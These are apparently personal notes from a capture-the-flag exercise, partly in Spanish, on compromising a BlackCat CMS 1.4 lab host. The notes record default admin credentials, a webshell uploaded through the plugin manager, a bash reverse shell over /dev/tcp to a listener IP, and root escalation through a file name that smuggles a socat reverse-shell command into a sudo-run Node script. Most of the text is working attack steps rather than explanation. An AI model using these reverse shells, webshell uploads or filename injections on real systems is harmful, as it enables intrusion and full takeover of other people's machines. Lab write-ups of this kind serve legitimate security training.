http://catcabbage.echocity-f.com/backend/start/index.php
http://catcabbage.echocity-f.com/backend/admintools/tool.php?tool=droplets

**Blackcat Cmsv1.4 RCE**: https://www.exploit-db.com/exploits/51605
## Credentials

- `admin`
- `admin123`


http://catcabbage.echocity-f.com/backend/admintools/tool.php?tool=jquery_plugin_mgr

Se sube un zip en donde comprimí lo siguiente:
- `webshell.php`
- `penelope.php`
- `payload.php` (pentest monkey)

> me funcionó una web shell
> Y penelope tambien

http://catcabbage.echocity-f.com/modules/lib_jquery/plugins/payloads/webshell.php?cmd=env+%7C+grep+CTF

```shell
bash -c 'exec bash >& /dev/tcp/10.10.2.6/4445 0>&1 &' # Principal
```

Al hacer el sudo -l tenemos /usr/local/bin/cabbage

```js
#! /usr/bin/env node
var args = process.argv.slice(2);
var compileSass = require('broccoli-compass');

if(args.length<1)
{
  console.error('Error, missing list of SASS files to process...');
  process.exit(1);
}
compileSass({}, {
    'files': args
}).write('.', '.');
```

### Priv Esc

```shell
touch "prueba2.sass; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.0.42:4444"

# Listener
socat file:`tty`,raw,echo=0 tcp-listen:444 
# Conexión desde la victima
sudo prueba2.sass; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.0.42:4444
```